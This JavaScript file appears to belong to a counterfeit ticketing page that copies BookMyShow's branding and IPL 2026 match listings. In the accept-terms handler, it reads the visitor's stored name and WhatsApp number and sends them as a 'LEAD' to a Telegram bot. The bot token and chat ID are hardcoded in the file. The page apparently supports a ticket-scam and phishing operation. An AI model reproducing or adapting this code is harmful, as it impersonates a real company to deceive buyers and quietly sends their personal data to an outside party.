const container = document.getElementById('event-container');
const footer = document.getElementById('event-footer');
const priceBox = document.getElementById('event-price');

const popup = document.getElementById('tnc-modal');
const box = document.getElementById('popup-box');

let startY = 0;

// ==========================================
// 🔥 GET FULL MATCH DATA (SAFE RECOVERY)
// ==========================================
let match = null;

try {
    const rawData = localStorage.getItem('selectedMatch');
    match = rawData ? JSON.parse(rawData) : null;
} catch (e) {
    match = null;
    console.error("LocalStorage Error", e);
}

console.log("EVENT MATCH DATA:", match);

// ❌ NO MATCH FOUND
if (!match) {
    if (container) {
        container.innerHTML = `<div class="loading">No Match Selected. <a href="index.html">Go Back</a></div>`;
    }
} else {

    // 🔥 IMPORTANT: SAVE ID FOR FIREBASE SYNC ON SEATS PAGE
    if (match.id) {
        localStorage.setItem("matchId", match.id);
    }

    const teams = (match.title || "Match").split(' vs ');

    // 🔥 RENDER UI (DETTO SCREENSHOT JAISE UPDATE KIYA HAI)
    container.innerHTML = `
    <div style="padding: 12px 16px; background: white; font-family: 'Inter', sans-serif; padding-bottom: 80px; overflow-x: hidden;">
        
        <div style="position: relative;">
            <img src="${match.banner}" style="width:100%; border-radius:12px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" onerror="this.src='https://via.placeholder.com/800x400?text=Banner+Not+Available'">
        </div>

        <div style="margin-top: 12px;">
            <span style="background:#f1f2f4; color: #333; padding:4px 8px; font-size:10px; font-weight: 700; border-radius:4px; text-transform: uppercase;">
                Cricket
            </span>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; border-radius: 8px; padding: 12px; margin-top: 16px;">
            <div style="display: flex; align-items: flex-start; gap: 10px;">
                <div style="color: #22c55e; font-size: 18px;">👍</div>
                <div>
                    <div style="font-weight: 700; font-size: 13px; color: #333;">78.1k are interested</div>
                    <div style="font-size: 11px; color: #666; margin-top: 2px;">Mark interested to know more about this event</div>
                </div>
            </div>
            <button style="border: 1px solid #f84464; color: #f84464; background: transparent; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600;">Interested?</button>
        </div>

        <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 14px; font-size: 13px; color: #333; font-weight: 500;">
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="far fa-calendar" style="color: #666; width: 16px; text-align: center;"></i>
                <span>${match.date || 'Sun 29 Mar 2026'}</span>
            </div>
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="far fa-clock" style="color: #666; width: 16px; text-align: center;"></i>
                <span>${match.time || '7:30 PM'}</span>
            </div>
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-hourglass-half" style="color: #666; width: 16px; text-align: center;"></i>
                <span>5 Hours</span>
            </div>
            <div style="display: flex; align-items: center; gap: 12px;">
                <i class="fas fa-language" style="color: #666; width: 16px; text-align: center;"></i>
                <span>English</span>
            </div>
            <div style="display: flex; align-items: flex-start; gap: 12px;">
                <i class="fas fa-map-marker-alt" style="color: #666; width: 16px; text-align: center; margin-top: 2px;"></i>
                <span style="flex: 1; line-height: 1.4;">${match.venue || 'Wankhede Stadium: Mumbai'}</span>
                <i class="fas fa-location-arrow" style="color: #999; margin-top: 2px;"></i>
            </div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="display: flex; justify-content: space-between; align-items: center; background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 10px 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 32px; height: 32px; background: #ffebee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px;">🏏</div>
                <span style="font-size: 11px; font-weight: 700; color: #333;">EXPLORE THE TOURNAMENT HOMEPAGE</span>
            </div>
            <i class="fas fa-chevron-right" style="color: #999; font-size: 12px;"></i>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="background: #fff5f3; border-radius: 8px; padding: 16px; border: 1px solid #feeadc;">
            <h3 style="font-size: 15px; font-weight: 700; color: #333; margin-bottom: 12px;">You should know</h3>
            <div style="display: flex; gap: 12px;">
                <i class="far fa-lightbulb" style="color: #444; font-size: 22px; margin-top: 2px;"></i>
                <div>
                    <p style="font-size: 12px; color: #333; font-weight: 600; margin-bottom: 6px;">Important Info:</p>
                    <ul style="font-size: 12px; color: #555; padding-left: 16px; margin: 0; line-height: 1.5;">
                        <li style="margin-bottom: 6px;">Ticket limit for this booking is 10 tickets per user.</li>
                        <li>Valid ID proof is required for stadium entry.</li>
                    </ul>
                    <div style="color: #f84464; font-size: 12px; font-weight: 600; margin-top: 8px;">Read More</div>
                </div>
            </div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div>
            <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 10px;">About The Event</h3>
            <p style="font-size: 13px; color: #555; line-height: 1.6; margin: 0;">
                Book tickets for <b>${teams[0] || 'Team A'} vs ${teams[1] || 'Team B'}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow. Watch the action live as ${teams[0] || 'Team A'} take on ${teams[1] || 'Team B'}...
            </p>
            <div style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 8px;">Read More</div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="display: flex; align-items: flex-start; gap: 12px; background: #f8f9fa; padding: 16px; border-radius: 8px;">
            <i class="fas fa-mobile-alt" style="color: #555; font-size: 22px;"></i>
            <div>
                <p style="font-size: 13px; color: #333; font-weight: 500; margin: 0; line-height: 1.4;">Contactless Ticketing & Fast-track Entry with M-ticket.</p>
                <div style="color: #f84464; font-size: 12px; font-weight: 600; margin-top: 6px;">Learn How</div>
            </div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div class="tnc-link" onclick="openTnc()" style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; cursor: pointer;">
            <span style="font-size: 13px; font-weight: 500; color: #333;">Terms & Conditions</span>
            <i class="fas fa-chevron-right" style="color: #999; font-size: 12px;"></i>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 0 -16px 20px;"></div>

        <div style="margin-top: 10px;">
            <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 4px;">You May Also Like</h3>
            <p style="font-size: 12px; color: #666; margin-bottom: 16px;">Events around you, book now</p>
            
            <div style="display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; scrollbar-width: none;">
                <div style="min-width: 130px; width: 130px;">
                    <img src="https://assets-in.bmscdn.com/discovery-catalog/events/tr:w-400,h-600,bg-CCCCCC:w-400.0,h-660.0,cm-pad_resize,bg-000000,fo-top:ote-VEFUQSBJUkwgMjAyNg%3D%3D,ots-29,otc-FFFFFF,oy-612,ox-24:q-80/et00311494-nntwcvtzrh-portrait.jpg" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px;">
                    <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">CSK vs RCB</div>
                    <div style="font-size: 11px; color: #666; margin-top: 2px;">TATA IPL 2026</div>
                </div>
                <div style="min-width: 130px; width: 130px;">
                    <img src="https://assets-in.bmscdn.com/discovery-catalog/events/tr:w-400,h-600,bg-CCCCCC:w-400.0,h-660.0,cm-pad_resize,bg-000000,fo-top:ote-VEFUQSBJUkwgMjAyNg%3D%3D,ots-29,otc-FFFFFF,oy-612,ox-24:q-80/et00311494-nntwcvtzrh-portrait.jpg" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px;">
                    <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">MI vs GT</div>
                    <div style="font-size: 11px; color: #666; margin-top: 2px;">TATA IPL 2026</div>
                </div>
                <div style="min-width: 130px; width: 130px;">
                    <img src="https://assets-in.bmscdn.com/discovery-catalog/events/tr:w-400,h-600,bg-CCCCCC:w-400.0,h-660.0,cm-pad_resize,bg-000000,fo-top:ote-VEFUQSBJUkwgMjAyNg%3D%3D,ots-29,otc-FFFFFF,oy-612,ox-24:q-80/et00311494-nntwcvtzrh-portrait.jpg" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px;">
                    <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">RR vs KKR</div>
                    <div style="font-size: 11px; color: #666; margin-top: 2px;">TATA IPL 2026</div>
                </div>
            </div>
        </div>

    </div>

    <div style="background: #333; padding: 40px 20px; text-align: center; margin: 0 -16px;">
        <img src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png" style="height: 30px; margin: 0 auto 20px; filter: brightness(0) invert(1);">
        
        <div style="display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; flex-wrap: wrap;">
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fab fa-facebook-f"></i></div>
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fa-brands fa-x-twitter"></i></div>
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fab fa-instagram"></i></div>
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fab fa-youtube"></i></div>
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fab fa-pinterest-p"></i></div>
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center; color: #000; font-size: 16px;"><i class="fab fa-linkedin-in"></i></div>
        </div>
        
        <p style="font-size: 11px; color: #888; line-height: 1.6; margin: 0;">
            Copyright 2026 © Bigtree Entertainment Pvt. Ltd. All Rights Reserved.<br><br>
            The content and images used on this site are copyright protected and copyrights vests with the respective owners. The usage of the content and images on this website is intended to promote the works and no endorsement of the artist shall be implied. Unauthorized use is prohibited and punishable by law.
        </p>
    </div>
    `;

    if (footer) footer.style.display = "flex";
    if (priceBox) priceBox.innerText = `₹${match.price || 0} onwards`;
}

// ==========================================
// 🔥 POPUP LOGIC (UNTOUCHED)
// ==========================================
window.openTnc = () => {
    if (popup) popup.classList.add('active');
};

function closePopup() {
    if (popup) popup.classList.remove('active');
    if (box) box.style.transform = 'translateY(0)';
}

const closeBtn = document.getElementById('close-popup');
if (closeBtn) {
    closeBtn.onclick = closePopup;
}

if (popup) {
    popup.addEventListener('click', (e) => {
        if (e.target === popup) closePopup();
    });
}

// ==========================================
// 🔥 ACCEPT → GO TO SEATS (UNTOUCHED LOGIC)
// ==========================================
const acceptBtn = document.getElementById('accept-tnc-btn');
if (acceptBtn) {
    acceptBtn.onclick = async () => {
        
        acceptBtn.innerText = "Processing...";
        acceptBtn.style.pointerEvents = "none";

        const loader = document.createElement('div');
        loader.innerHTML = `
            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #f84464; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Getting Things Ready...</h3>
                <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Moving to Seat Selection</p>
                <style>
                    @keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </style>
            </div>
        `;
        document.body.appendChild(loader);
        
        if (typeof fbq !== "undefined") {
            fbq('track', 'InitiateCheckout');
        }

        const name = localStorage.getItem('customerName') || "Unknown";
        const phone = localStorage.getItem('customerPhone') || "Unknown";
        const matchTitle = match ? match.title : "Unknown Match";

        const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
        const chatId = "6820660513"; 
        
        const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                            `👤 *Name:* ${name}\n` +
                            `📞 *WhatsApp:* ${phone}\n` +
                            `🏏 *Match:* ${matchTitle}\n` +
                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;

        try {
            await fetch(url);
        } catch (e) {
            console.log("Telegram Error");
        } finally {
            closePopup();
            localStorage.setItem('selectedMatch', JSON.stringify(match));
            window.location.href = "seats.html";
        }
    };
}

// ==========================================
// 🔥 BOOK BUTTON (UNTOUCHED)
// ==========================================
const bookNowBtn = document.getElementById('book-now-btn');
if (bookNowBtn) {
    bookNowBtn.onclick = () => {
        openTnc();
    };
}

// ==========================================
// 🔥 SWIPE CLOSE LOGIC (UNTOUCHED)
// ==========================================
if (box) {
    box.addEventListener('touchstart', (e) => {
        startY = e.touches[0].clientY;
    });

    box.addEventListener('touchmove', (e) => {
        let move = e.touches[0].clientY - startY;
        if (move > 0) {
            box.style.transform = `translateY(${move}px)`;
        }
    });

    box.addEventListener('touchend', (e) => {
        let diff = e.changedTouches[0].clientY - startY;

        if (diff > 100) {
            closePopup();
        } else {
            box.style.transform = 'translateY(0)';
        }
    });
}
